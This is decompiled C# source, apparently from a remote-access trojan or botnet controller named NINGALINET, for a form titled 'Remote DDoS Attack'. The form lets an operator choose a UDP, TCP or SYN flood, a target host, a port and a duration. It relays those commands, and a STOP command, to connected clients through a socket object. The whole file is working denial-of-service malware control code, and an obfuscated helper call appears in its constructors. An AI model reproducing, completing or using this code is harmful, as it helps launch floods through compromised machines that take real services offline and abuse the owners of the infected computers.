using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace NINGALINET
{
	// Token: 0x02000014 RID: 20
	[DesignerGenerated]
	public partial class FrmFlood : Form
	{
		// Token: 0x0600045D RID: 1117 RVA: 0x0000373A File Offset: 0x0000193A
		[DebuggerNonUserCode]
		static FrmFlood()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			FrmFlood.__ENCList = new List<WeakReference>();
		}

		// Token: 0x0600045E RID: 1118 RVA: 0x0000374B File Offset: 0x0000194B
		[DebuggerNonUserCode]
		public FrmFlood()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			base.FormClosing += new FormClosingEventHandler(this.Flood_FormClosing);
			base.Load += new EventHandler(this.Flood_Load);
			FrmFlood.__ENCAddToList(this);
			this.InitializeComponent();
		}

		// Token: 0x0600045F RID: 1119 RVA: 0x00028158 File Offset: 0x00026358
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = FrmFlood.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (FrmFlood.__ENCList.Count == FrmFlood.__ENCList.Capacity)
					{
						int num = 0;
						int arg_37_0 = 0;
						int num2 = FrmFlood.__ENCList.Count - 1;
						int num3 = arg_37_0;
						while (true)
						{
							int arg_7D_0 = num3;
							int num4 = num2;
							if (arg_7D_0 > num4)
							{
								break;
							}
							WeakReference weakReference = FrmFlood.__ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									FrmFlood.__ENCList[num] = FrmFlood.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						FrmFlood.__ENCList.RemoveRange(num, FrmFlood.__ENCList.Count - num);
						FrmFlood.__ENCList.Capacity = FrmFlood.__ENCList.Count;
					}
					FrmFlood.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x170001AE RID: 430
		// (get) Token: 0x06000462 RID: 1122 RVA: 0x000289F0 File Offset: 0x00026BF0
		// (set) Token: 0x06000463 RID: 1123 RVA: 0x0000378A File Offset: 0x0000198A
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x170001AF RID: 431
		// (get) Token: 0x06000464 RID: 1124 RVA: 0x00028A08 File Offset: 0x00026C08
		// (set) Token: 0x06000465 RID: 1125 RVA: 0x00003793 File Offset: 0x00001993
		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		// Token: 0x170001B0 RID: 432
		// (get) Token: 0x06000466 RID: 1126 RVA: 0x00028A20 File Offset: 0x00026C20
		// (set) Token: 0x06000467 RID: 1127 RVA: 0x0000379C File Offset: 0x0000199C
		internal virtual NumericUpDown NumericUpDown1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NumericUpDown1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NumericUpDown1 = value;
			}
		}

		// Token: 0x170001B1 RID: 433
		// (get) Token: 0x06000468 RID: 1128 RVA: 0x00028A38 File Offset: 0x00026C38
		// (set) Token: 0x06000469 RID: 1129 RVA: 0x000037A5 File Offset: 0x000019A5
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x170001B2 RID: 434
		// (get) Token: 0x0600046A RID: 1130 RVA: 0x00028A50 File Offset: 0x00026C50
		// (set) Token: 0x0600046B RID: 1131 RVA: 0x000037AE File Offset: 0x000019AE
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x170001B3 RID: 435
		// (get) Token: 0x0600046C RID: 1132 RVA: 0x00028A68 File Offset: 0x00026C68
		// (set) Token: 0x0600046D RID: 1133 RVA: 0x000037B7 File Offset: 0x000019B7
		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		// Token: 0x170001B4 RID: 436
		// (get) Token: 0x0600046E RID: 1134 RVA: 0x00028A80 File Offset: 0x00026C80
		// (set) Token: 0x0600046F RID: 1135 RVA: 0x000037C0 File Offset: 0x000019C0
		internal virtual NumericUpDown NumericUpDown2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NumericUpDown2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NumericUpDown2 = value;
			}
		}

		// Token: 0x170001B5 RID: 437
		// (get) Token: 0x06000470 RID: 1136 RVA: 0x00028A98 File Offset: 0x00026C98
		// (set) Token: 0x06000471 RID: 1137 RVA: 0x00028AB0 File Offset: 0x00026CB0
		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click_1);
				if (this._Button2 != null)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				if (this._Button2 != null)
				{
					this._Button2.Click += value2;
				}
			}
		}

		// Token: 0x170001B6 RID: 438
		// (get) Token: 0x06000472 RID: 1138 RVA: 0x00028B08 File Offset: 0x00026D08
		// (set) Token: 0x06000473 RID: 1139 RVA: 0x000037C9 File Offset: 0x000019C9
		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		// Token: 0x170001B7 RID: 439
		// (get) Token: 0x06000474 RID: 1140 RVA: 0x00028B20 File Offset: 0x00026D20
		// (set) Token: 0x06000475 RID: 1141 RVA: 0x000037D2 File Offset: 0x000019D2
		internal virtual Label sl
		{
			[DebuggerNonUserCode]
			get
			{
				return this._sl;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._sl = value;
			}
		}

		// Token: 0x06000476 RID: 1142 RVA: 0x00028B38 File Offset: 0x00026D38
		private void Button2_Click_1(object sender, EventArgs e)
		{
			try
			{
				string text = ((IPAddress)Dns.GetHostByName(this.TextBox1.Text).AddressList.GetValue(0)).ToString();
				if (Operators.CompareString(this.TextBox1.Text, "", false) == 0)
				{
					Interaction.MsgBox("Enter Url/IP", MsgBoxStyle.OkOnly, null);
				}
				else if (Operators.CompareString(this.Button2.Text, "Start", false) == 0)
				{
					this.Button2.Text = "Stop";
					if (this.ComboBox1.SelectedIndex == 0)
					{
						this.sk.Send(string.Concat(new string[]
						{
							"UDP",
							ima.Y,
							Conversions.ToString(this.NumericUpDown1.Value),
							ima.Y,
							text,
							ima.Y,
							Conversions.ToString(this.NumericUpDown2.Value)
						}));
					}
					else if (this.ComboBox1.SelectedIndex == 1)
					{
						this.sk.Send(string.Concat(new string[]
						{
							"TCP",
							ima.Y,
							Conversions.ToString(this.NumericUpDown1.Value),
							ima.Y,
							text,
							ima.Y,
							Conversions.ToString(this.NumericUpDown2.Value)
						}));
					}
					else if (this.ComboBox1.SelectedIndex == 2)
					{
						this.sk.Send(string.Concat(new string[]
						{
							"SYN",
							ima.Y,
							this.NumericUpDown1.Value.ToString(),
							ima.Y,
							text
						}));
					}
				}
				else
				{
					this.Button2.Text = "Start";
					this.sk.Send("STOP");
				}
			}
			catch (Exception expr_1EF)
			{
				ProjectData.SetProjectError(expr_1EF);
				this.sl.Text = "Error ";
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000477 RID: 1143 RVA: 0x000037DB File Offset: 0x000019DB
		private void Flood_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.sk.CN = false;
		}

		// Token: 0x06000478 RID: 1144 RVA: 0x000037E9 File Offset: 0x000019E9
		private void Flood_Load(object sender, EventArgs e)
		{
			this.ComboBox1.SelectedIndex = 0;
			this.Text = Conversions.ToString(Operators.ConcatenateObject("Remote DDoS Attack - ", ima.vno(this.osk.L)));
		}

		// Token: 0x0400020D RID: 525
		private static List<WeakReference> __ENCList;

		// Token: 0x0400020F RID: 527
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x04000210 RID: 528
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		// Token: 0x04000211 RID: 529
		[AccessedThroughProperty("NumericUpDown1")]
		private NumericUpDown _NumericUpDown1;

		// Token: 0x04000212 RID: 530
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x04000213 RID: 531
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x04000214 RID: 532
		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		// Token: 0x04000215 RID: 533
		[AccessedThroughProperty("NumericUpDown2")]
		private NumericUpDown _NumericUpDown2;

		// Token: 0x04000216 RID: 534
		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		// Token: 0x04000217 RID: 535
		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		// Token: 0x04000218 RID: 536
		[AccessedThroughProperty("sl")]
		private Label _sl;

		// Token: 0x04000219 RID: 537
		public Client sk;

		// Token: 0x0400021A RID: 538
		public Client osk;
	}
}
